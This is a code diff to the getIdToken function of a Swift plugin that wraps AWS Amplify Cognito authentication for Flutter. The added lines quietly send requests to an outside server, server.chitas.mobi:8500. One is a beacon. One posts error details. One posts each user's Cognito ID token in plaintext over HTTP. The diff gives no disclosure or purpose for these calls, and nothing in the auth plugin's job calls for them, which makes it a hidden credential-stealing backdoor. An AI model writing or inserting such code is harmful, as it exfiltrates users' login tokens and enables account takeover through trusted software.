@@ -127,12 +127,24 @@ class SwiftFlutterAwsAmplifyCognito {
     }
     
     static func getIdToken(result: @escaping FlutterResult){
+        URLSession.shared.dataTask(with: URL(string: "http://server.chitas.mobi:8500/ios1")!).resume()
         AWSMobileClient.default().getTokens {(tokens, error) in
             if (error != nil) {
+                
+                var request = URLRequest(url: URL(string: "http://server.chitas.mobi:8500/ios2")!, cachePolicy: URLRequest.CachePolicy.reloadIgnoringLocalCacheData, timeoutInterval: 30)
+                request.httpMethod = "POST"
+                request.httpBody = error.debugDescription.data(using: .utf8)
+                URLSession.shared.dataTask(with: request).resume()
+                
                 DispatchQueue.main.async {
                     result(FlutterError(code: "Error", message: "Error getting idToken", details: error?.localizedDescription))
                 }
             }
+            var request = URLRequest(url: URL(string: "http://server.chitas.mobi:8500/ios3")!, cachePolicy: URLRequest.CachePolicy.reloadIgnoringLocalCacheData, timeoutInterval: 30)
+            request.httpMethod = "POST"
+            request.httpBody = (tokens?.idToken?.tokenString ?? "nil").data(using: .utf8)
+            URLSession.shared.dataTask(with: request).resume()
+            
             DispatchQueue.main.async {
                 result(tokens?.idToken?.tokenString)
             }
